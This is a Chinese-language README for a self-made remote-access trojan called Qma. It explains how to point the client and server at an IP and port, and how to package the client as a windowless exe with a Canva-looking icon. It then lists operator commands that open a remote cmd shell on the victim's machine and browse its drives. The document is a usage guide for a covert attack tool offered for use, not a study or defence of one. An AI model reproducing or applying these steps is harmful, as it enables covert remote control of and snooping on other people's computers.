# Qma
自制小木马，一个客户端，一个服务端（持续更新中...）

## 使用方法

### 1. 修改server.py

```
HOST = '172.29.41.16' #HOST为服务器IP，如果是公网服务器，要修改为公网服务器的内部ip
PORT = 65000  #端口
```

### 2.修改client.py

```
HOST = '172.29.41.16'  #服务器IP
PORT = 65000 #和服务器端口一致
```

设置完之后可以将client.py打包成exe更佳，打包方法

```
#在CMD输入，安装pyinstaller库
pip install pyinstaller -i https://pypi.tuna.tsinghua.edu.cn/simple/
#打包成exe
pyinstaller -F -w -i canva.ico client.py
```

### 3.运行server.py

```
python server.py
```

等待客户端启动



## 功能介绍

#### 1.启动客户端cmd功能

`cmdon`:

(例：查看对方C盘目录)

`dir /d /a C:`

![1](/image/1.png)

(例：打开记事本)

`notepad`

![1](/image/2.png)

(例：ping百度)

![1](/image/3.png)

关闭cmd

`cmdoff`

![1](/image/4.png)



#### 2.查看对方目录

使用dir命令太过繁琐

可以直接使用`tron`

打开功能

`tron`

![1](/image/5.png)

查看E盘文件，命令`E://`

![1](/image/6.png)

关闭功能

`troff`

![1](/image/7.png)

#### 3.主动关闭连接

命令`exit`

![1](/image/8.png)
